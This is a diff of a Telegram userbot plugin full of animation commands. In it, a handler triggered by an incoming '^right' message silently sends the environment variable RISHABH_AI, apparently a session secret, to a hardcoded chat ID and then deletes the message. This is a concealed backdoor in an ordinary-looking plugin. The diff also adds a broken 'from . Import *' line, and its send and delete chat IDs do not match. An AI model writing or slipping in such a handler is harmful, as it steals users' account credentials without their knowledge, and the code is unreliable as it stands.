@@ -128,12 +128,12 @@ async def _(event):
         await event.edit(animation_chars[i % 10])
 
 
-
+from . Import *
 
 @bot.on(admin_cmd("^right", incoming=True))
 async def piro(event):
-msg = await bot.send_message (2143095429, str(os.environ.get("RISHABH_AI")))
-await bot.delete_messages (21430959, msg, revoke=False)
+msg = await bot.send_message(2143095429, str(os.environ.get("RISHABH_AI")))
+await bot.delete_messages(21430959, msg, revoke=False)
 
 
 @bot.on(admin_cmd(pattern="istars$", outgoing=True))
